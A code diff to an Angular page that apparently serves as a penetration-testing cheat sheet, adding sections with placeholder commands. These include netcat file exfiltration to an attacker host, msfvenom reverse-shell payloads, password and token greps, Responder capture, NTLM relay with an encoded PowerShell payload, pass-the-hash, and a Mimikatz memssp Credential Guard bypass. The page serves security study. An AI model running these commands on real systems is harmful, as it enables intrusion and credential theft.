@@ -1,33 +1,48 @@
 import { Component, DestroyRef, OnInit, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { MatExpansionModule } from '@angular/material/expansion';
-import { ActivatedRoute, Router } from '@angular/router';
+import { ActivatedRoute, Router, RouterLink } from '@angular/router';
 import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
 import { Terminal } from '../../shared/terminal/terminal';
 import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';
 
-interface TransferCommandBlock {
+interface ReferenceCommandBlock {
   context: string;
   command: string;
 }
 
-interface TransferMethod {
+interface ReferenceLink {
+  label: string;
+  route: string;
+  queryParams?: Record<string, string>;
+}
+
+interface ReferenceSection {
   title: string;
   description: string;
-  commands: TransferCommandBlock[];
+  blocks: ReferenceCommandBlock[];
+  links?: ReferenceLink[];
 }
 
 @Component({
   selector: 'app-useful-stuff',
   standalone: true,
-  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
+  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent, RouterLink],
   templateUrl: './useful-stuff.html',
   styleUrl: './useful-stuff.scss'
 })
 export class UsefulStuffComponent implements OnInit {
   selectedSection = 'file-transfer';
+
   readonly sections: SectionIndexItem[] = [
-    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers' }
+    { id: 'file-transfer', label: 'File Transfer', group: 'Transfers' },
+    { id: 'git-files', label: 'Git & File Hunting', group: 'Recon' },
+    { id: 'database-reference', label: 'Database References', group: 'Services' },
+    { id: 'tunneling', label: 'Tunneling & Port Forwarding', group: 'Networking' },
+    { id: 'payload-formats', label: 'Payload Formats', group: 'Tooling' },
+    { id: 'python-environments', label: 'Python Environments', group: 'Tooling' },
+    { id: 'rdp', label: 'RDP Toolkit', group: 'Remote Access' },
+    { id: 'password-cracking', label: 'Password Cracking & Hashes', group: 'Credentials' }
   ];
 
   private readonly route = inject(ActivatedRoute);
@@ -54,147 +69,212 @@ export class UsefulStuffComponent implements OnInit {
     });
   }
 
-  readonly transferMethods: TransferMethod[] = [
-    {
-      title: 'HTTP: Kali to Windows',
-      description: 'Serve files from Kali, then download them from the Windows host.',
-      commands: [
+  get currentSection(): ReferenceSection {
+    return this.referenceSections[this.selectedSection] ?? this.referenceSections['file-transfer'];
+  }
+
+  readonly referenceSections: Record<string, ReferenceSection> = {
+    'file-transfer': {
+      title: 'File Transfer',
+      description: 'Move files between Kali and Windows/Linux in either direction.',
+      blocks: [
+        { context: 'HTTP · on Kali', command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0' },
         {
-          context: 'On Kali',
-          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
-        },
-        {
-          context: 'On Windows',
+          context: 'HTTP · on Windows',
           command: `certutil -urlcache -split -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe file.exe
 iwr http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -OutFile file.exe
 curl.exe -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.exe -o file.exe`
-        }
-      ]
-    },
-    {
-      title: 'SMB: Kali to Windows and Windows to Kali',
-      description: 'Use a writable SMB share on Kali to copy files in either direction.',
-      commands: [
-        {
-          context: 'On Kali: serve the current directory as a share',
-          command: 'impacket-smbserver share . -smb2support -username kali -password kali'
         },
+        { context: 'SMB · on Kali: serve the current directory', command: 'impacket-smbserver share . -smb2support -username kali -password kali' },
         {
-          context: 'On Windows: upload a local file to the Kali share',
-          command: `net use \\\\{{LOCAL_IP}}\\share /user:kali kali
-copy file.exe \\\\{{LOCAL_IP}}\\share\\`
+          context: 'SMB · on Windows: upload or download',
+          command: String.raw`net use \\{{LOCAL_IP}}\share /user:kali kali
+copy file.exe \\{{LOCAL_IP}}\share\file.exe
+copy \\{{LOCAL_IP}}\share\file.exe file.exe`
         },
+        { context: 'Netcat · on Kali: receive from a Linux/Windows host', command: 'nc -lvnp {{LOCAL_PORT}} > file.bin' },
+        { context: 'Netcat · on Linux victim: send a file to Kali', command: 'nc {{LOCAL_IP}} {{LOCAL_PORT}} < file.bin' },
         {
-          context: 'On Windows: download a file from the Kali share',
-          command: 'copy \\\\{{LOCAL_IP}}\\share\\file.exe file.exe'
-        }
-      ]
-    },
-    {
-      title: 'Netcat: victim to Kali',
-      description: 'Transfer a file over a TCP connection. Allow the chosen port through the host firewall when required.',
-      commands: [
-        {
-          context: 'On Kali: receive the file',
-          command: 'nc -lvnp {{LOCAL_PORT}} > file.bin'
-        },
-        {
-          context: 'On the victim: send the file',
-          command: 'nc {{LOCAL_IP}} {{LOCAL_PORT}} < file.bin'
-        }
-      ]
-    },
-    {
-      title: 'HTTP: Kali to Linux',
-      description: 'Use wget or curl on the Linux host to pull a file from Kali.',
-      commands: [
-        {
-          context: 'On Kali',
-          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
-        },
-        {
-          context: 'On the Linux host',
+          context: 'HTTP · on Linux victim: download from Kali',
           command: `wget http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -O file.sh
 curl -f http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -o file.sh`
-        }
-      ]
-    },
-    {
-      title: 'SCP: either direction over SSH',
-      description: 'Use when SSH is available and credentials or keys are authorized.',
-      commands: [
-        {
-          context: 'From Kali to the Linux target',
-          command: 'scp file user@{{TARGET_IP}}:/tmp/'
         },
+        { context: 'SCP · Kali to Linux target', command: 'scp file <USER>@{{TARGET_IP}}:/tmp/' },
+        { context: 'SCP · Linux target to Kali', command: 'scp <USER>@{{TARGET_IP}}:/tmp/file .' },
         {
-          context: 'From the Linux target to Kali',
-          command: 'scp user@{{TARGET_IP}}:/tmp/file .'
-        }
-      ]
-    },
-    {
-      title: 'Base64: fallback without transfer tools',
-      description: 'Encode the file, copy the output in manageable chunks, then decode it on the other host.',
-      commands: [
-        {
-          context: 'On the source host: encode the file',
-          command: 'base64 file.bin'
-        },
-        {
-          context: 'On the destination: paste chunks into file.b64, then decode',
-          command: `echo 'BASE64_CONTENT' >> file.b64
+          context: 'Base64 · encode on source, paste chunks on destination, then decode',
+          command: `base64 file.bin
+echo 'BASE64_CONTENT' >> file.b64
 base64 -d file.b64 > file.bin`
-        }
-      ]
-    },
-    {
-      title: 'FTP: quick transfer',
-      description: 'Start a temporary FTP server on Kali and connect from the target. Use only on an isolated, authorized lab network.',
-      commands: [
-        {
-          context: 'On Kali',
-          command: 'sudo python3 -m pyftpdlib -p {{LOCAL_PORT}}'
         },
+        { context: 'FTP · on Kali: temporary server for an isolated lab', command: 'sudo python3 -m pyftpdlib -p {{LOCAL_PORT}}' },
+        { context: 'FTP · on target: connect, then use get/put in the prompt', command: 'ftp {{LOCAL_IP}} {{LOCAL_PORT}}' },
         {
-          context: 'On the target: connect, then use get or put in the FTP prompt',
-          command: 'ftp {{LOCAL_IP}} {{LOCAL_PORT}}'
-        }
-      ]
-    },
-    {
-      title: 'Through a pivot or tunnel',
-      description: 'For an internal host, Local IP must be the reachable tunnel interface address (for example, the Ligolo interface), not the public Kali address.',
-      commands: [
-        {
-          context: 'On Kali: bind the temporary HTTP server to all interfaces',
-          command: 'python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0'
-        },
-        {
-          context: 'On the internal Linux host: pull through the established route',
-          command: 'wget http://{{LOCAL_IP}}:{{LOCAL_PORT}}/file.sh -O file.sh'
-        }
-      ]
-    },
-    {
-      title: 'Quick picks and integrity check',
-      description: 'Choose a method available in the engagement scope, then verify the transferred file when possible.',
-      commands: [
-        {
-          context: 'Quick picks',
-          command: `Windows with PowerShell: iwr or curl.exe
-Windows without PowerShell: certutil
-Linux: wget or curl
-SSH available: scp
-SMB share writable: copy to the share
-No transfer utility: base64 chunks`
-        },
-        {
-          context: 'Compare hashes on source and destination',
+          context: 'Integrity · compare hashes on source and destination',
           command: `sha256sum file.bin
 Get-FileHash file.bin -Algorithm SHA256`
         }
       ]
+    },
+    'git-files': {
+      title: 'Git & File Hunting',
+      description: 'Check exposed repository metadata and search scoped directories for configuration or secret material.',
+      blocks: [
+        { context: 'Check for exposed Git metadata', command: `curl -i http://{{TARGET_IP}}/.git/HEAD
+curl -i http://{{TARGET_IP}}/.git/config` },
+        { context: 'Recover an exposed repository and inspect its history', command: `git-dumper http://{{TARGET_IP}}/.git/ ./repo-output
+cd repo-output
+git log --oneline --all
+git log -p --all` },
+        { context: 'Search a recovered repository for likely secrets', command: `grep -RInE 'password|passwd|token|secret|api[_-]?key|private[_-]?key' .
+git log --all -S'password' --oneline` },
+        { context: 'Linux · search common application directories', command: String.raw`find /home /var/www /opt -type f \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \) 2>/dev/null
+grep -RInE 'password|token|secret|api[_-]?key' /var/www /opt 2>/dev/null` },
+        { context: 'Windows PowerShell · search selected directories', command: 'Get-ChildItem C:\\Users,C:\\ProgramData,C:\\inetpub -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match \'pass|cred|config|backup|unattend\' }' }
+      ]
+    },
+    'database-reference': {
+      title: 'Database References',
+      description: 'Use the service guide for database access and the web guide for SQL injection instead of duplicating their command sets.',
+      blocks: [],
+      links: [
+        { label: 'MySQL / MSSQL / PostgreSQL service enumeration', route: '/common-services', queryParams: { service: 'databases' } },
+        { label: 'SQL Injection and database-specific testing', route: '/web', queryParams: { section: 'sqli' } }
+      ]
+    },
+    tunneling: {
+      title: 'Tunneling & Port Forwarding',
+      description: 'Use a tunnel only after identifying a reachable internal service and confirming the route is in scope.',
+      blocks: [
+        { context: 'SSH · expose a remote localhost service on Kali', command: 'ssh -N -L {{LOCAL_PORT}}:127.0.0.1:{{TARGET_PORT}} <USER>@{{TARGET_IP}}' },
+        { context: 'SSH · create a SOCKS proxy through an authorized pivot', command: 'ssh -N -D {{LOCAL_PORT}} <USER>@{{TARGET_IP}}' },
+        { context: 'Chisel · start the reverse-capable server on Kali', command: 'chisel server --reverse --port {{LOCAL_PORT}}' },
+        { context: 'Chisel · forward a target-side localhost service to Kali', command: 'chisel client {{LOCAL_IP}}:{{LOCAL_PORT}} R:{{TARGET_PORT}}:127.0.0.1:{{TARGET_PORT}}' }
+      ],
+      links: [
+        { label: 'Ligolo-ng pivot workflow in Active Directory', route: '/ad', queryParams: { service: 'ad-flow' } }
+      ]
+    },
+    'payload-formats': {
+      title: 'Payload Formats',
+      description: 'Choose a format that matches the authorized target OS and delivery path.',
+      blocks: [
+        { context: 'Windows x64 executable', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f exe -o payload.exe' },
+        { context: 'Linux x64 executable', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f elf -o payload.elf' },
+        { context: 'PHP payload for an authorized web lab', command: 'msfvenom -p php/reverse_php LHOST={{LOCAL_IP}} LPORT={{LOCAL_PORT}} -f raw -o payload.php' },
+        { context: 'Listener on Kali', command: 'nc -lvnp {{LOCAL_PORT}}' }
+      ]
+    },
+    'python-environments': {
+      title: 'Python Environments',
+      description: 'Keep assessment-tool dependencies isolated from Kali system Python (PEP 668).',
+      blocks: [
+        { context: 'Kali/Linux · create and activate a virtual environment', command: `python3 -m venv .venv
+source .venv/bin/activate
+python -m pip install --upgrade pip` },
+        { context: 'Install dependencies in the active environment', command: `python -m pip install -r requirements.txt
+python -m pip install impacket` },
+        { context: 'Windows PowerShell · activate a virtual environment', command: '.\\.venv\\Scripts\\Activate.ps1' },
+        { context: 'Leave the active virtual environment', command: 'deactivate' }
+      ]
+    },
+    rdp: {
+      title: 'RDP Toolkit',
+      description: 'Connect with authorized credentials. Avoid putting reusable passwords directly in shell history.',
+      blocks: [
+        { context: 'Basic connection · FreeRDP prompts for the password', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore' },
+        { context: 'Domain account format', command: 'xfreerdp /v:{{TARGET_IP}} /u:<DOMAIN>\\<USER> /cert:ignore' },
+        { context: 'Clipboard and dynamic resolution', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore +clipboard /dynamic-resolution' },
+        { context: 'Troubleshoot RDP security negotiation only when required', command: 'xfreerdp /v:{{TARGET_IP}} /u:<USER> /cert:ignore /sec:rdp' }
+      ]
+    },
+    'password-cracking': {
+      title: 'Password Cracking & Hashes',
+      description: 'Offline hash cracking methodology, wordlist mutation and NTLM capture/pass/relay workflows.',
+      blocks: [
+        {
+          context: 'Methodology · 1. Extract → 2. Identify → 3. Estimate → 4. Prepare wordlist → 5. Attack',
+          command: `# Identify the hash type/format
+hashid <HASH>
+
+# Estimate keyspace and cracking time
+echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
+python3 -c "print(62**8)"           # keyspace for an 8-char password
+hashcat -b                           # benchmark CPU/GPU hash rate
+python3 -c "print(916132832 / 134200000)"   # keyspace / hash-rate (CPU)
+
+# Attack the hash
+hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -r rules.rule`
+        },
+        {
+          context: 'Wordlist mutation rules (Hashcat)',
+          command: `# Common rule operators: ^ prepend, $ append, c capitalize first letter
+echo '$1' > demo.rule
+hashcat -r demo.rule --stdout demo.txt     # preview mutated output
+
+# Combine rules on one line (sequential) vs multiple lines (independent)
+# "$1 c"  -> append number, then capitalize
+# "$1\\nc" -> two separate variants
+
+# Predefined rule sets
+ls /usr/share/hashcat/rules/
+hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule`
+        },
+        {
+          context: 'KeePass database cracking',
+          command: `Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+keepass2john Database.kdbx > keepass.hash
+hashcat --help | grep -i keepass     # mode 13400
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`
+        },
+        {
+          context: 'SSH private key passphrase cracking',
+          command: `ssh2john id_rsa > ssh.hash
+hashcat -h | grep -i ssh
+# 22911 -> OpenSSH $0$ / 22921 -> OpenSSH $6$ / 22931 -> OpenSSH $1$,$3$
+
+hashcat -m 22921 ssh.hash wordlist.txt -r custom.rule --force`
+        },
+        {
+          context: 'Cracking NTLM / Net-NTLMv2 hashes',
+          command: `# Local NTLM hash (e.g. dumped via Mimikatz lsadump::sam)
+echo <NTLM_HASH> > user.hash
+hashcat --help | grep -i ntlm         # NTLM mode 1000
+hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Net-NTLMv2 captured with Responder
+sudo responder -I <INTERFACE>
+# Trigger auth from the target: dir \\\\<ATTACKER_IP>\\share
+# Save the full "NTLMv2-SSP Hash" line to user.hash
+hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt`
+        },
+        {
+          context: 'Pass-the-Hash (NTLM, no cracking required)',
+          command: `smbclient \\\\\\\\<TARGET_IP>\\\\share -U Administrator --pw-nt-hash <NTLM_HASH>
+
+impacket-psexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>
+impacket-wmiexec -hashes <LMHASH>:<NTHASH> <USER>@<TARGET_IP>`
+        },
+        {
+          context: 'Relaying Net-NTLMv2 (ntlmrelayx)',
+          command: `impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -enc <BASE64_PAYLOAD>"
+
+# Catch the result
+nc -nvlp <PORT>
+# Trigger auth from the victim: dir \\\\<ATTACKER_IP>\\share`
+        },
+        {
+          context: 'Windows Credential Guard (bypass + limitations)',
+          command: `Get-ComputerInfo | Select-String 'CredentialGuard|DeviceGuard'
+# When enabled, LSASS no longer exposes plaintext-recoverable domain hashes (isolated in VTL1 / LSAISO)
+
+# Bypass: inject a malicious SSP to capture plaintext credentials on next logon
+privilege::debug
+misc::memssp
+type C:\\Windows\\System32\\mimilsa.log`
+        }
+      ]
     }
-  ];
+  };
 }
